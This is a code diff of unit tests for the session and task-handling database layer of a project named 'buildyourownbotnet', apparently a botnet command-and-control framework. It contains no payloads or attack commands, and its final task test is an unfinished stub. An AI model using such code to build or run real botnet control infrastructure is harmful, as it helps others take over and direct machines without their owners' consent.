@@ -2,26 +2,15 @@ import pytest
 import uuid
 from datetime import datetime
 from buildyourownbotnet import app, db, bcrypt
-from buildyourownbotnet.core import database
-from buildyourownbotnet.models import User, Session
+from buildyourownbotnet.core import dao
+from buildyourownbotnet.models import User, Session, Task
+from ..conftests import new_user, new_session
 
-
-@pytest.fixture(scope='module')
-def new_user():
-    test_username = 'test_user'
-    user = User.query.filter_by(username=test_username).first()
-    if not user:
-        hashed_password = bcrypt.generate_password_hash('test_password').decode('utf-8')
-        user = User(username=test_username, password=hashed_password)
-        db.session.add(user)
-        db.session.commit()
-    return user
-
-def test_new_session(new_user):
+def test_handle_session(new_user):
     """
     Given a new user,
-    when a new user is created and a new session is added for that usesr,
-    then check the session is associated with that only that user correctly.
+    when a new user is created via dao.handle_session function,
+    then check the session metadata is stored in the database correctly. 
     """
     # add test session
     uid = str(uuid.uuid4())
@@ -42,7 +31,7 @@ def test_new_session(new_user):
 			"longitude": 0.00,
 			"owner": new_user.username,
     }
-    output_session_dict = database.handle_session(input_session_dict)
+    output_session_dict = dao.handle_session(input_session_dict)
 
     # run tests
     session = Session.query.filter_by(uid=uid)
@@ -52,3 +41,13 @@ def test_new_session(new_user):
     # clean up
     session.delete()
     db.session.commit()
+
+def test_handle_send_task(new_session):
+    """
+    Given a session,
+    when a new task is issued by the user,
+    check that the task is issued a UID, an issued timestamp, 
+    and the metadata is stored in the database correctly.
+    """
+    task_dict = {}
+    task = Task()
